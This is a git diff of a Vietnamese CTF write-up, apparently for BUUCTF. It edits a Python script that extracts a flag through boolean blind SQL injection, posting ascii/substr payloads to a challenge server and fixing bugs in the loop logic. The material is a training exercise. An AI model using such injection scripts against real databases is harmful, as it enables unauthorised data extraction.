@@ -28,20 +28,20 @@ Kết quả trả về là ` Do you want to be my girlfriend?` là FALSE nên pa
 ```python
 import requests
 s = requests.session()
-url = "http://a146b56f-b5b5-4d88-a61c-492aff01376a.node4.buuoj.cn:81/index.php"
+url = "http://eac5836a-8b85-4734-8978-e7cac7166c02.node4.buuoj.cn:81/index.php"
 pos = 0
 flag = ''
 while True:
     pos += 1
-    for i in range(45,127):
-        payload = f"1=(ascii(substr((select(flag)from(flag)),{pos},1))={i})"
-        print = ("testing"+chr(i))
+    for i in range(45, 127):
+        payload = f"1=((ascii(substr((select(flag)from(flag)),{pos},1))={i}))"
+        print("testing"+chr(i))
         r = s.post(url, data={'id':payload})
-        if "glzjin" in r.text:
-            flag+=chr(i)
-            break
-        else:
-            break
-        print(flag)
-
+        if "glzjin " in r.text:
+            flag+=chr(i) 
+            break   
+    else:
+        break
+print(flag)
 ```
+![image](https://github.com/Llam-a/BUUCTF/assets/115911041/92e9ddbd-3955-4c45-89e9-91f4c139e290)
